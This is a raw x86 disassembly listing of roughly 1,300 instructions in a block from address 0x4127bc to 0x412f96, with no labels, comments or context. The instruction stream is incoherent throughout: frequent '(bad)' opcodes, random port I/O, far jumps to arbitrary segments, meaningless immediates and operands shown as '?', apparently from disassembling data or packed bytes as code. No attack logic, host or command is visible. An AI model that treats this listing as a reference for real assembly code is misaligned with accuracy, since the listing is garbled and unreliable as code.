  4127bc:	mov    DWORD PTR [eax+0x78ae443],ebx
  4127c2:	add    esp,esi
  4127c4:	call   0xa546a30b
  4127c9:	sbb    eax,0x7271ab15
  4127ce:	lds    edx,FWORD PTR [ebx+ecx*4]
  4127d1:	imul   ecx,DWORD PTR [ebp-0x56],0x48
  4127d5:	add    bh,al
  4127d7:	xor    eax,0x9042b80c
  4127dc:	push   ds
  4127dd:	jnp    0x41275f
  4127df:	adc    al,BYTE PTR [eax]
  4127e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e2:	push   esp
  4127e3:	(bad)  
  4127e5:	(bad)  
  4127e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e7:	jnp    0x412856
  4127e9:	push   ss
  4127ea:	adc    eax,0x9ee19011
  4127ef:	and    al,0xd
  4127f1:	sti    
  4127f2:	data16 mov ds:0x7509d6a2,al
  4127f8:	jb     0x412786
  4127fa:	gs (bad) 
  4127fd:	xor    DWORD PTR [edx-0x176ffdb0],edx
  412803:	mov    cl,0xaf
  412805:	pop    eax
  412806:	jbe    0x4127fd
  412808:	stc    
  412809:	cmp    ah,BYTE PTR [eax+0x41ffbdf]
  41280f:	test   DWORD PTR [edx],ebp
  412811:	in     eax,dx
  412812:	in     al,dx
  412813:	xchg   esi,eax
  412814:	test   BYTE PTR [eax-0x2ac00b7c],al
  41281a:	xor    al,0x96
  41281c:	in     eax,dx
  41281d:	mov    al,ds:0x36b3febc
  412822:	fldenv [edi]
  412824:	pop    edx
  412825:	pop    ebx
  412826:	pop    ss
  412827:	je     0x412802
  412829:	div    bh
  41282b:	xor    ch,BYTE PTR ds:0x3a679c33
  412831:	dec    esp
  412832:	std    
  412833:	cmp    BYTE PTR [edi],0x5f
  412836:	fldpi  
  412838:	push   edx
  412839:	out    dx,eax
  41283a:	out    0xb2,al
  41283c:	and    dl,BYTE PTR [esi+0x28]
  41283f:	icebp  
  412840:	push   ebx
  412841:	mov    edi,0x1796a4b1
  412846:	ret    0xd096
  412849:	ss or  al,0x14
  41284c:	nop
  41284d:	in     eax,dx
  41284e:	add    BYTE PTR ds:[esi+esi*1-0x22],bl
  412853:	xchg   ecx,eax
  412854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412855:	mov    esi,0xaa538694
  41285a:	imul   esp,DWORD PTR [ebp+0x5babcf18],0x9effdca1
  412864:	mov    DWORD PTR [ebx+0x54b87db7],edx
  41286a:	mov    eax,0x9f0dec1
  41286f:	mov    ebx,0x4d36156d
  412874:	pop    eax
  412875:	punpckhdq mm4,QWORD PTR [edi-0x1dc4d0a2]
  41287c:	fwait
  41287d:	stos   BYTE PTR es:[edi],al
  41287e:	xchg   ebp,eax
  41287f:	aad    0xe3
  412881:	mov    al,0x93
  412883:	imul   BYTE PTR [ebp-0x2fd6ad5a]
  412889:	loop   0x412847
  41288b:	out    dx,eax
  41288c:	clc    
  41288d:	cmp    DWORD PTR [edi+0x34],esi
  412890:	xchg   ebp,eax
  412891:	or     esp,DWORD PTR [ebp+0x7e068951]
  412897:	sbb    DWORD PTR [edx-0x62],ebp
  41289a:	shl    DWORD PTR [ebx-0x3e],1
  41289d:	and    ch,dh
  41289f:	or     ebp,0x1d664926
  4128a5:	stc    
  4128a6:	ja     0x4128de
  4128a8:	add    ebx,esi
  4128aa:	add    eax,esi
  4128ac:	push   ebp
  4128ad:	and    DWORD PTR ds:[eax],0xfdb43f4d
  4128b4:	popf   
  4128b5:	push   cs
  4128b6:	ja     0x412887
  4128b8:	addr16 aaa 
  4128ba:	sub    edx,eax
  4128bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128bd:	sbb    ecx,DWORD PTR [ebx]
  4128bf:	mov    esp,0xe9a03346
  4128c4:	mov    ch,0x30
  4128c6:	xor    al,0x96
  4128c8:	pop    ds
  4128c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ca:	imul   BYTE PTR [eax-0x652dfbf1]
  4128d0:	mov    cl,0x97
  4128d2:	xor    edx,0xdcbb831f
  4128d8:	mov    ah,0xd2
  4128da:	retf   0xfe32
  4128dd:	fidivr WORD PTR [esi+0x4a]
  4128e0:	lods   al,BYTE PTR ds:[esi]
  4128e1:	push   edi
  4128e2:	dec    esi
  4128e3:	pop    ebp
  4128e4:	add    al,0x39
  4128e6:	pop    ebp
  4128e7:	neg    DWORD PTR [esi-0x3a]
  4128ea:	jmp    0x5014530b
  4128ef:	xchg   esi,eax
  4128f0:	xor    al,0xd9
  4128f2:	sbb    dl,BYTE PTR [ebp-0x65dab16]
  4128f8:	or     al,0x28
  4128fa:	mov    bh,0xc7
  4128fc:	outs   dx,DWORD PTR ds:[esi]
  4128fd:	push   edx
  4128fe:	and    esi,edi
  412900:	add    BYTE PTR ds:0x65dcaa21,ah
  412906:	fld    TBYTE PTR es:[edi]
  412909:	mov    DWORD PTR [edx+0x750f33f1],ecx
  41290f:	repz scas eax,DWORD PTR es:[edi]
  412911:	fwait
  412912:	inc    ebp
  412913:	inc    ebp
  412914:	and    dl,BYTE PTR [esp+edx*4]
  412917:	fimul  DWORD PTR [esi+ebx*8]
  41291a:	sub    al,0xb9
  41291c:	push   ebx
  41291d:	jno    0x412903
  41291f:	inc    edx
  412920:	jnp    0x4128ec
  412922:	ins    DWORD PTR es:[edi],dx
  412923:	pop    ss
  412924:	xchg   BYTE PTR [eax+0x17],dh
  412927:	cmc    
  412928:	jmp    0x1b8c1d93
  41292d:	call   0xc4d69e51
  412932:	retf   
  412933:	addr16 jbe 0x41295c
  412936:	aas    
  412937:	mov    eax,ds:0x331d07af
  41293c:	ds je  0x4128d6
  41293f:	dec    ebx
  412940:	retf   0x6a5c
  412943:	aaa    
  412944:	aam    0x4a
  412946:	call   0x2054:0x7c0ecb0f
  41294d:	cmp    ebp,DWORD PTR [esi+0x47d6f8d]
  412953:	cli    
  412954:	dec    esp
  412955:	daa    
  412956:	sbb    al,0x19
  412958:	adc    BYTE PTR [ebx-0x6],ah
  41295b:	dec    esi
  41295c:	push   0xffffffe8
  41295e:	jge    0x412970
  412960:	mov    BYTE PTR [edi],dl
  412962:	loope  0x41296b
  412964:	scas   al,BYTE PTR es:[edi]
  412965:	shr    DWORD PTR [ebp+ebp*4-0x39],0x8e
  41296a:	fcom   DWORD PTR [eax]
  41296c:	ret    0x987b
  41296f:	xor    BYTE PTR [edx+0x5b],dh
  412972:	inc    ebp
  412973:	in     eax,dx
  412974:	scas   eax,DWORD PTR es:[edi]
  412975:	in     al,0x8
  412977:	jg     0x4129c1
  412979:	pop    eax
  41297a:	push   es
  41297b:	jnp    0x4128fd
  41297d:	shr    DWORD PTR [eax-0x26013ca4],1
  412983:	loope  0x412923
  412985:	addr16 mov eax,ds:0xe027
  412989:	or     al,0xe1
  41298b:	and    eax,0x75b9d6ec
  412990:	mov    ebp,0xd913d945
  412995:	test   al,0x6a
  412997:	(bad)  
  412998:	sub    al,0x4a
  41299a:	out    dx,eax
  41299b:	inc    eax
  41299c:	dec    ebp
  41299d:	sti    
  41299e:	add    ebp,0x59a3b4c8
  4129a4:	jle    0x4129af
  4129a6:	mov    WORD PTR [esi-0x7269f9e],ds
  4129ac:	jnp    0x4129e8
  4129ae:	sub    ebp,ebp
  4129b0:	jns    0x4129cc
  4129b2:	ret    0x2c34
  4129b5:	cmp    al,0x9b
  4129b7:	(bad)  
  4129b8:	cwde   
  4129b9:	inc    eax
  4129ba:	add    BYTE PTR [eax-0x5a],ah
  4129bd:	add    ch,al
  4129bf:	jecxz  0x4129d9
  4129c1:	data16 (bad) 
  4129c3:	push   esi
  4129c4:	aad    0xa9
  4129c6:	xor    al,0x9d
  4129c8:	add    al,0x57
  4129ca:	mov    bh,BYTE PTR [esi]
  4129cc:	pop    es
  4129cd:	inc    edi
  4129ce:	adc    DWORD PTR [ecx-0x79c3afae],0x70
  4129d5:	and    DWORD PTR [edx+0x20b89b26],eax
  4129db:	(bad)  
  4129dd:	mov    ch,al
  4129df:	add    esi,0x84e7662e
  4129e5:	mov    dl,0x5b
  4129e7:	fnclex 
  4129e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129ea:	aas    
  4129eb:	pop    ebp
  4129ec:	xor    eax,0xc53ce3ed
  4129f1:	aaa    
  4129f2:	or     ebp,DWORD PTR [edx+0x5df5206]
  4129f8:	(bad)
  4129fb:	ins    DWORD PTR es:[edi],dx
  4129fc:	call   0x3400:0x43b0b8c5
  412a03:	mov    al,ds:0x89c2fc9e
  412a08:	jl     0x412998
  412a0a:	repnz fistp DWORD PTR [ebx-0x34]
  412a0e:	cmp    BYTE PTR [edi],al
  412a10:	repnz mov al,ds:0xbe870705
  412a16:	pop    eax
  412a17:	daa    
  412a18:	xchg   esp,eax
  412a19:	bswap  esi
  412a1b:	pop    es
  412a1c:	jo     0x4129f9
  412a1e:	rcl    BYTE PTR [edi],cl
  412a20:	and    eax,0xa9685c37
  412a25:	xchg   edi,eax
  412a26:	jae    0x412a4e
  412a28:	sbb    eax,0x6fbdfd40
  412a2d:	push   cs
  412a2e:	inc    ecx
  412a2f:	add    edi,DWORD PTR [ecx+ebp*2-0x7c]
  412a33:	push   esi
  412a34:	xchg   ecx,eax
  412a35:	mov    bh,0x44
  412a37:	std    
  412a38:	sub    WORD PTR [esi+0x54d7d56b],di
  412a3f:	dec    edx
  412a40:	mov    bh,ah
  412a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a43:	add    al,0x24
  412a45:	int3   
  412a46:	adc    al,0xb4
  412a48:	xchg   BYTE PTR ds:[eax],al
  412a4b:	stc    
  412a4c:	dec    ecx
  412a4d:	popf   
  412a4e:	fcmove st,st(3)
  412a50:	mov    edi,0x5a201d31
  412a55:	or     ebp,ebx
  412a57:	loop   0x412aa8
  412a59:	test   edi,edi
  412a5b:	out    0xc4,eax
  412a5d:	inc    edi
  412a5e:	neg    ecx
  412a60:	ins    BYTE PTR es:[edi],dx
  412a61:	shl    ah,cl
  412a63:	mov    ds:0x4abce1c6,eax
  412a68:	sub    ch,bh
  412a6a:	imul   edx,ecx,0x48
  412a6d:	or     eax,0x7af9f7bd
  412a72:	and    ch,BYTE PTR [ebx+0x42fc1107]
  412a78:	ss in  eax,0x62
  412a7b:	mov    ebp,0x2bffd1fc
  412a80:	cmp    BYTE PTR ds:0xbe5136de,cl
  412a86:	add    BYTE PTR [esi+0x46],bl
  412a89:	shl    BYTE PTR [ecx+ebx*1],0x7
  412a8d:	inc    edx
  412a8e:	adc    dl,BYTE PTR [esi]
  412a90:	mov    al,0xc7
  412a92:	mov    dl,0x1
  412a94:	sbb    dh,dl
  412a96:	nop
  412a97:	add    ebx,ecx
  412a99:	or     DWORD PTR [ebp+eax*2-0x46c8e5d1],esp
  412aa0:	sub    BYTE PTR [esi+0x7b],cl
  412aa3:	mov    al,ds:0x95d08ab7
  412aa8:	cwde   
  412aa9:	stc    
  412aaa:	jo     0x412a47
  412aac:	mov    bh,0xc
  412aae:	push   edi
  412aaf:	cmp    DWORD PTR [ebp+0x64],esi
  412ab2:	sbb    eax,0x26ed3d26
  412ab7:	in     al,dx
  412ab8:	imul   eax
  412aba:	popa   
  412abb:	jae    0x412b28
  412abd:	fs bound ebx,QWORD PTR gs:[edi+0x5]
  412ac2:	jb     0x412b28
  412ac4:	lahf   
  412ac5:	dec    ebx
  412ac6:	add    cl,BYTE PTR [ebp-0x69ed3d27]
  412acc:	aad    0x62
  412ace:	shl    esi,0xe3
  412ad1:	cmp    al,0xcc
  412ad3:	sbb    ebp,DWORD PTR [edi-0x34af07d6]
  412ad9:	into   
  412ada:	daa    
  412adb:	loopne 0x412b07
  412add:	stos   BYTE PTR es:[edi],al
  412ade:	mov    edi,0x297c4a82
  412ae3:	xchg   BYTE PTR [eax+eax*4],ch
  412ae6:	xlat   BYTE PTR ds:[ebx]
  412ae7:	jge    0x412a71
  412ae9:	cli    
  412aea:	inc    ebp
  412aeb:	sub    dh,BYTE PTR es:[ebp+0x1b]
  412aef:	sub    DWORD PTR cs:[ecx+0x79],ebp
  412af3:	jmp    0x57964cbf
  412af8:	es xchg ebp,eax
  412afa:	add    eax,edi
  412afc:	pop    es
  412afd:	adc    ch,BYTE PTR [eax-0x45b5a427]
  412b03:	push   0xbcf5844b
  412b08:	loope  0x412b1d
  412b0a:	mov    al,ds:0x91558806
  412b0f:	and    eax,0x8ff8d7e4
  412b14:	ja     0x412b8b
  412b16:	dec    edi
  412b17:	test   eax,ecx
  412b19:	add    ebp,DWORD PTR [esi+0x5ca3fd27]
  412b1f:	pop    ss
  412b20:	es repz or al,0xe5
  412b24:	into   
  412b25:	int    0x46
  412b27:	nop
  412b28:	je     0x412aaf
  412b2a:	ds cs dec ebp
  412b2d:	mov    eax,ds:0xc1d51c6b
  412b32:	mov    dh,0x58
  412b34:	dec    ebx
  412b35:	and    eax,0xb0c51828
  412b3a:	stos   DWORD PTR es:[edi],eax
  412b3b:	mov    cl,0x1e
  412b3d:	xchg   edx,eax
  412b3e:	push   esi
  412b3f:	mov    eax,cs:0xf79aa37d
  412b45:	stos   BYTE PTR es:[edi],al
  412b46:	rol    ecx,cl
  412b48:	add    esp,0xfb253d86
  412b4e:	stos   BYTE PTR es:[edi],al
  412b4f:	test   al,0x7a
  412b51:	sahf   
  412b52:	je     0x412ad9
  412b54:	(bad)  
  412b55:	pop    edi
  412b56:	xchg   ecx,eax
  412b57:	in     al,0x24
  412b59:	gs test ecx,ecx
  412b5c:	dec    ecx
  412b5d:	adc    ecx,esp
  412b5f:	mov    ecx,0x893de072
  412b64:	pusha  
  412b65:	inc    edx
  412b66:	retf   
  412b67:	clc    
  412b68:	add    ebx,esi
  412b6a:	jmp    0x412b03
  412b6c:	xchg   edx,eax
  412b6d:	push   edi
  412b6f:	lea    ebp,[esi-0x74]
  412b72:	(bad)  
  412b73:	jg     0x412b82
  412b75:	jg     0x412bb9
  412b77:	sbb    BYTE PTR [esi-0x4],dl
  412b7a:	push   ecx
  412b7b:	popa   
  412b7c:	inc    eax
  412b7d:	and    ebx,DWORD PTR [edi]
  412b7f:	inc    ebx
  412b80:	xchg   ecx,eax
  412b81:	ficom  DWORD PTR [eax+0x28]
  412b84:	inc    ebp
  412b85:	dec    edx
  412b86:	adc    BYTE PTR fs:[ebx],0x8
  412b8a:	in     eax,dx
  412b8b:	daa    
  412b8c:	mov    al,ds:0x7b34c7ef
  412b91:	out    dx,eax
  412b92:	pop    ds
  412b93:	xchg   edi,eax
  412b94:	pusha  
  412b95:	(bad)  
  412b96:	mov    edi,0x33c6c9a7
  412b9b:	jb     0x412b9a
  412b9d:	or     BYTE PTR ds:0xa9713c56,cl
  412ba3:	mov    ah,0x6
  412ba5:	sub    al,0x2d
  412ba7:	outs   dx,BYTE PTR ds:[esi]
  412ba8:	xchg   edx,eax
  412ba9:	sbb    ebx,ebp
  412bab:	mov    eax,ds:0xcb72d822
  412bb0:	adc    esi,DWORD PTR ss:[edx-0x3b]
  412bb4:	cmp    eax,0x20edcaba
  412bb9:	xor    BYTE PTR [esi-0x73471300],dh
  412bbf:	fsub   DWORD PTR [ebp+ecx*8-0x759993a9]
  412bc6:	arpl   WORD PTR [ebp+0x72],si
  412bc9:	mov    fs,ebx
  412bcb:	push   esi
  412bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bcd:	lock es scas eax,DWORD PTR es:[edi]
  412bd0:	jmp    0xbcc:0x7f40627f
  412bd7:	sbb    dh,BYTE PTR [esi+0x6099e44a]
  412bdd:	ror    esi,cl
  412bdf:	test   eax,0xf487bfe8
  412be4:	mov    dh,0x25
  412be6:	outs   dx,BYTE PTR ds:[esi]
  412be7:	fbld   TBYTE PTR [edx+edx*8+0x67]
  412beb:	fs pop edi
  412bed:	sub    eax,DWORD PTR ds:0xa00cb401
  412bf3:	inc    eax
  412bf4:	mov    BYTE PTR [ebx-0x55],ah
  412bf7:	dec    ebp
  412bf8:	and    BYTE PTR gs:[eax+edx*4],ch
  412bfc:	(bad)  
  412bfd:	retf   
  412bfe:	add    BYTE PTR [esi-0x2f0defce],ch
  412c04:	idiv   bh
  412c06:	xor    DWORD PTR [eax-0x1fb052e9],edx
  412c0c:	push   cs
  412c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c0e:	xor    eax,0xec92b4d
  412c13:	(bad)  
  412c14:	mov    ecx,0x93df73cc
  412c19:	(bad)  
  412c1a:	lods   al,BYTE PTR ds:[esi]
  412c1b:	popa   
  412c1c:	push   ebp
  412c1d:	not    BYTE PTR [esi]
  412c1f:	pop    ebx
  412c20:	sbb    DWORD PTR [edi],0xb2624bda
  412c26:	nop
  412c27:	in     eax,dx
  412c28:	add    eax,0xeff14d25
  412c2d:	sbb    DWORD PTR [esi-0xbdc15f6],edx
  412c33:	in     eax,0x52
  412c35:	mov    ebx,ecx
  412c37:	nop
  412c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c39:	daa    
  412c3a:	mov    ds:0xf3de3c93,al
  412c3f:	aam    0x40
  412c41:	and    al,0x98
  412c43:	les    esi,FWORD PTR [esi]
  412c45:	sub    al,0xbd
  412c47:	add    edx,ecx
  412c49:	mov    eax,0x664596b
  412c4e:	adc    eax,0xd5d1a895
  412c53:	inc    edi
  412c54:	add    eax,0xcd2d905f
  412c59:	add    esi,DWORD PTR [edx]
  412c5b:	cmp    al,0x44
  412c5d:	scas   eax,DWORD PTR es:[edi]
  412c5e:	bound  esi,QWORD PTR ds:0xc0e9ea1b
  412c64:	retf   0x7b0c
  412c67:	xchg   edx,eax
  412c68:	aad    0xb3
  412c6a:	imul   BYTE PTR [edx]
  412c6c:	outs   dx,BYTE PTR ds:[esi]
  412c6d:	jbe    0x412c9f
  412c6f:	pop    ebp
  412c70:	arpl   WORD PTR [ebx+0x7],bp
  412c73:	jmp    0x412cde
  412c75:	xor    eax,0x385ab2b0
  412c7a:	add    WORD PTR [edi-0x4ea2f43b],ax
  412c81:	pushf  
  412c82:	aas    
  412c83:	xor    ecx,DWORD PTR [edi+0x7d529f3f]
  412c89:	inc    ebp
  412c8a:	and    al,0x5d
  412c8c:	mov    ah,al
  412c8e:	dec    edx
  412c8f:	lock jae 0x412cc4
  412c92:	gs repz popa 
  412c95:	call   0xd6740c87
  412c9a:	mov    ds:0xcdc8d1a2,eax
  412c9f:	and    eax,0x8eb9a6b
  412ca4:	sub    eax,0xc0205ca1
  412ca9:	xor    eax,DWORD PTR [esi]
  412cab:	mov    ch,0xc
  412cad:	sar    edi,1
  412caf:	jecxz  0x412c95
  412cb1:	leave  
  412cb2:	sub    eax,0x7b64a58a
  412cb7:	fld    QWORD PTR [eax]
  412cb9:	add    al,0x1e
  412cbb:	pushf  
  412cbc:	xor    edx,DWORD PTR [eax*2+0x2ca7f250]
  412cc3:	xbegin 0xd42f7da2
  412cc9:	sbb    ebx,ecx
  412ccb:	outs   dx,DWORD PTR ds:[esi]
  412ccc:	dec    ecx
  412ccd:	outs   dx,BYTE PTR ds:[esi]
  412cce:	stc    
  412ccf:	inc    esp
  412cd0:	and    eax,0x82f42c24
  412cd5:	int    0xe7
  412cd7:	sahf   
  412cd8:	and    eax,0xfbf4f711
  412cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cde:	jo     0x412d5d
  412ce0:	push   0x8d229549
  412ce5:	rcl    DWORD PTR [edi+0x1181817c],cl
  412ceb:	adc    cl,0x9
  412cee:	xchg   BYTE PTR [esi-0x4f],bl
  412cf1:	mov    ds:0xf1b3f3af,eax
  412cf6:	loop   0x412cb1
  412cf8:	in     eax,0x1f
  412cfa:	in     al,dx
  412cfb:	push   es
  412cfc:	lds    ebp,FWORD PTR [ecx-0x2335dddb]
  412d02:	pop    ebx
  412d03:	ret    0x6bf2
  412d06:	sub    al,0x55
  412d08:	loop   0x412cf5
  412d0a:	ja     0x412cdd
  412d0c:	mov    edx,edi
  412d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d0f:	jl     0x412d39
  412d11:	mov    edx,?
  412d13:	mov    ch,0xe0
  412d15:	xchg   ebx,eax
  412d16:	or     esi,DWORD PTR [eax+0x5e804b76]
  412d1c:	dec    DWORD PTR [eax]
  412d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d1f:	sub    al,0xc7
  412d21:	loopne 0x412d73
  412d23:	add    al,0x52
  412d25:	shl    DWORD PTR [ebx+0x3f3573c3],1
  412d2b:	(bad)  
  412d2d:	out    dx,eax
  412d2e:	mov    eax,ds:0xde8acb52
  412d33:	test   DWORD PTR [ebx+ebp*2-0x20807c9b],0xb2b60129
  412d3e:	dec    ebp
  412d3f:	mov    al,0x4b
  412d41:	dec    edx
  412d42:	or     bh,BYTE PTR [eax+0x715cb16e]
  412d48:	js     0x412d1e
  412d4a:	add    eax,0x463da5e
  412d4f:	xor    BYTE PTR [ebx-0x754beb06],dl
  412d55:	mov    ebp,0xdccb7cd7
  412d5a:	sbb    eax,0x2433cd2
  412d5f:	adc    bl,BYTE PTR [eax+0x5e]
  412d62:	dec    edx
  412d63:	mov    edx,DWORD PTR [esi-0x61989922]
  412d69:	cli    
  412d6a:	mov    eax,ds:0x2f44a2f1
  412d6f:	sub    DWORD PTR [eax],eax
  412d71:	mov    ds:0x925ffbfa,al
  412d76:	lods   eax,DWORD PTR ds:[esi]
  412d77:	pushf  
  412d78:	les    ebp,FWORD PTR [esi+0x46ef8a23]
  412d7e:	rol    BYTE PTR [ecx+0x109a15a5],0x30
  412d85:	dec    edx
  412d86:	out    dx,eax
  412d87:	cmc    
  412d88:	sbb    DWORD PTR [edi+edi*4+0x3fc7df79],edi
  412d8f:	and    eax,0xaf43585b
  412d94:	mov    ebp,0xb8c0b544
  412d99:	in     eax,dx
  412d9a:	jo     0x412dd4
  412d9c:	pop    ss
  412d9d:	ret    
  412d9e:	loope  0x412d37
  412da0:	ins    BYTE PTR es:[edi],dx
  412da1:	das    
  412da2:	pop    es
  412da3:	fs mov ah,0xc2
  412da6:	loop   0x412d8b
  412da8:	lods   al,BYTE PTR ds:[esi]
  412da9:	imul   ebp,ebp,0xb46f8600
  412daf:	lock out 0x69,al
  412db2:	xchg   ecx,eax
  412db3:	jne    0x412d65
  412db5:	jno    0x412db3
  412db7:	xchg   ebx,eax
  412db8:	stos   DWORD PTR es:[edi],eax
  412db9:	(bad)  
  412dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dbb:	test   DWORD PTR [ebp-0x40],esp
  412dbe:	mov    al,0xb8
  412dc0:	pop    ds
  412dc1:	push   ebp
  412dc2:	aad    0x13
  412dc4:	add    al,BYTE PTR [eax]
  412dc6:	sub    dh,al
  412dc8:	pushf  
  412dc9:	or     al,0x20
  412dcb:	inc    edi
  412dcc:	mov    cl,0xb2
  412dce:	adc    eax,0x3985f825
  412dd3:	dec    eax
  412dd4:	xchg   ebx,eax
  412dd5:	data16 stc 
  412dd7:	pop    edi
  412dd8:	inc    ebp
  412dd9:	jb     0x412e48
  412ddb:	jmp    0x9630102b
  412de0:	jmp    0x61ed:0x473f936b
  412de7:	jno    0x412d8b
  412de9:	push   ss
  412dea:	lods   eax,DWORD PTR ds:[esi]
  412deb:	xor    edx,DWORD PTR [ebp+0x10]
  412dee:	pushf  
  412def:	aaa    
  412df0:	pop    ebx
  412df1:	je     0x412dac
  412df3:	push   0xca6480d0
  412df8:	retf   0x5acf
  412dfb:	add    al,0xbd
  412dfd:	cld    
  412dfe:	cld    
  412dff:	(bad)  
  412e01:	xor    DWORD PTR [ebx+edx*2+0x2baa217d],ecx
  412e08:	stos   DWORD PTR es:[edi],eax
  412e09:	xchg   edi,eax
  412e0a:	cmp    esi,edi
  412e0c:	arpl   bx,sp
  412e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e0f:	push   es
  412e10:	pop    es
  412e11:	inc    eax
  412e12:	push   esp
  412e13:	dec    ebp
  412e14:	aaa    
  412e15:	add    eax,0x9c4f2004
  412e1a:	ins    DWORD PTR es:[edi],dx
  412e1b:	out    0xeb,eax
  412e1d:	xor    eax,0xb527fe96
  412e22:	xchg   ebp,eax
  412e23:	inc    eax
  412e24:	hlt    
  412e25:	dec    eax
  412e26:	xor    edx,edi
  412e28:	mov    eax,0x9bb287bc
  412e2d:	mov    bh,0x40
  412e2f:	and    eax,0x35a9d748
  412e34:	lea    edi,[esi+0x36]
  412e37:	(bad)  
  412e38:	adc    eax,0xa6aee53b
  412e3d:	clc    
  412e3e:	mov    al,ds:0x5c280a66
  412e43:	inc    ebp
  412e44:	icebp  
  412e45:	cmp    BYTE PTR [ecx+0x10a3094a],ch
  412e4b:	aad    0xd7
  412e4d:	retf   0x5eb3
  412e50:	(bad)  
  412e52:	dec    DWORD PTR [edx+0x6c50a699]
  412e58:	popa   
  412e59:	dec    ecx
  412e5a:	pop    es
  412e5b:	loopne 0x412e47
  412e5d:	das    
  412e5e:	cdq    
  412e5f:	dec    ebx
  412e60:	rcr    DWORD PTR [ebx+0x28067504],0x6d
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	(bad)  
  412e69:	mov    ds:0xb15b2a51,al
  412e6e:	push   edi
  412e6f:	push   edi
  412e70:	xor    BYTE PTR [esi-0x759ae948],ah
  412e76:	not    DWORD PTR [ecx]
  412e78:	into   
  412e79:	jbe    0x412e5f
  412e7b:	mov    ss,WORD PTR [ebx]
  412e7d:	aaa    
  412e7e:	dec    ecx
  412e7f:	repnz test cl,bh
  412e82:	pop    ebx
  412e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e84:	fmul   DWORD PTR [ebx-0x739b740a]
  412e8a:	cdq    
  412e8b:	in     eax,0xc8
  412e8d:	mov    dh,0x30
  412e8f:	jns    0x412ee5
  412e91:	neg    ebp
  412e93:	stc    
  412e94:	test   eax,0xbee505c5
  412e99:	mov    esi,0xca7097a4
  412e9e:	clc    
  412e9f:	xor    bl,ah
  412ea1:	cmp    BYTE PTR [ecx],bl
  412ea3:	pop    ecx
  412ea4:	rcl    BYTE PTR [edi-0x57],0x5e
  412ea8:	push   es
  412ea9:	fsub   QWORD PTR [edx-0x2d]
  412eac:	sbb    cl,bh
  412eae:	out    dx,eax
  412eaf:	imul   eax,DWORD PTR [ebp+0x75],0x9cfde7f7
  412eb6:	dec    ecx
  412eb7:	pop    esi
  412eb8:	jmp    0x412f38
  412eba:	dec    ecx
  412ebc:	jmp    0x6595:0xd1daa63
  412ec3:	rol    DWORD PTR [ebx],1
  412ec5:	dec    esi
  412ec6:	add    al,0x7
  412ec8:	ret    0x9093
  412ecb:	sub    bl,BYTE PTR [ebx-0x4]
  412ece:	mov    ebp,0x628f5bd7
  412ed3:	aaa    
  412ed4:	jmp    0x412f2e
  412ed6:	cli    
  412ed7:	imul   ecx,edx,0xffffff81
  412eda:	dec    eax
  412edb:	shl    DWORD PTR ds:0x88bded2b,0xd4
  412ee2:	cmp    ecx,DWORD PTR [ebp+ebx*8-0x6540e05c]
  412ee9:	sub    edi,eax
  412eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eec:	jnp    0x412f37
  412eee:	sar    ebp,1
  412ef0:	xchg   ecx,eax
  412ef1:	cmp    ah,BYTE PTR [eax+0x46582056]
  412ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef8:	jns    0x412f11
  412efa:	rcr    DWORD PTR [edi-0x2e],1
  412efd:	pop    eax
  412efe:	loope  0x412f2a
  412f00:	(bad)  [ecx]
  412f02:	jb     0x412f00
  412f04:	mov    ebx,0xf6ad5026
  412f09:	out    0xa9,eax
  412f0b:	push   0x3daae227
  412f10:	imul   edi,esi,0x65
  412f13:	pop    ds
  412f14:	inc    ebx
  412f15:	gs push ss
  412f17:	pop    esp
  412f18:	cli    
  412f19:	dec    edi
  412f1a:	mov    dl,0x95
  412f1c:	add    eax,0x409efef9
  412f21:	or     BYTE PTR [ecx],cl
  412f23:	ret    
  412f24:	jl     0x412ec4
  412f26:	cmp    edx,DWORD PTR [edx]
  412f28:	sbb    eax,0xcdb42274
  412f2d:	sbb    BYTE PTR [esi-0x25],dl
  412f30:	mov    edx,0xfb385d2c
  412f35:	adc    DWORD PTR [ebx],edx
  412f37:	test   DWORD PTR [eax],esi
  412f39:	pushf  
  412f3a:	and    eax,0x4752806d
  412f3f:	mov    ecx,0x20534d2e
  412f44:	je     0x412f5a
  412f46:	xchg   ecx,eax
  412f47:	push   0x9a48690a
  412f4c:	cmc    
  412f4d:	push   eax
  412f4e:	cwde   
  412f4f:	mov    eax,ds:0x2033af50
  412f54:	cld    
  412f55:	aad    0xa9
  412f57:	inc    esi
  412f58:	rep lods eax,DWORD PTR fs:[esi]
  412f5b:	push   ebx
  412f5c:	dec    ebx
  412f5d:	test   eax,0x36bbbe90
  412f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f64:	or     al,bl
  412f66:	adc    edx,DWORD PTR [edx-0x34bc475]
  412f6c:	aad    0xff
  412f6e:	les    esp,FWORD PTR [edi-0x6f]
  412f71:	iret   
  412f72:	adc    eax,DWORD PTR [edi+0x4b]
  412f75:	push   0x8aafbb18
  412f7a:	fidivr WORD PTR [ebx+0x3c]
  412f7d:	imul   esp,ebp,0x42
  412f80:	leave  
  412f81:	cmp    al,0x2b
  412f83:	dec    ax
  412f85:	ds repz mov edi,0xa84d5016
  412f8c:	mov    DWORD PTR [ecx-0x1b],esi
  412f8f:	clc    
  412f90:	fild   QWORD PTR [ebp-0x6f308c36]
  412f96:	mov    ebx,?
